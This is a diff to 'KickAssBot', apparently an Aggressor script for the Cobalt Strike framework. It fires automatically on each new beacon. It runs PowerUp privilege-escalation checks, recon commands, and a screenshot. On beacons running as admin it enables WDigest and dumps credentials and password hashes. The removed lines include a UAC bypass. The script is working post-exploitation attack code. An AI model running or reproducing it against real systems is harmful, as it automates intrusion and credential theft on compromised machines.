@@ -1,20 +1,23 @@
-#This is KickAssBot [https://github.com/kussic/CS-KickassBot]
-$KABver = "1.0"; 
+##This is KickAssBot [https://github.com/kussic/CS-KickassBot]
+$KABver = "1.1";
 
 on beacon_initial {
 	say("A new beacon popped up, I'm sending the initial commands...");
-    bpowershell_import($1, script_resource("scripts/PowerUp.ps1"));
+  bpowershell_import($1, script_resource("scripts/PowerUp1.ps1"));
 	bpowershell($1, "Invoke-AllChecks");
-	bsleep($1,10,30);
-	bshell($1, "whoami /groups");
-	bshell($1, "systeminfo");
-	bshell($1, "ipconfig /all");
-	bbypassuac("$1", listeners()[0]);
-	bwdigest($1);
+	bshell($1,"ipconfig & whoami & date /t & time /t")
+
 	bscreenshot($1,0);
-	blogonpasswords($1);	
-	bhashdump($1);
+	openScreenshotBrowser();
+
 	bnote("$1", mynick() . " - Init Completed \[" . formatDate("yyyy.MM.dd HH:mm:ss z") . "\]");
+
+	if (" *" isin beacon_info($1, "user")) {
+		blog("This user is an admin!");
+		bwdigest($1);
+		blogonpasswords($1);
+		bhashdump($1);
+	}
 }
 
 on beacon_output {
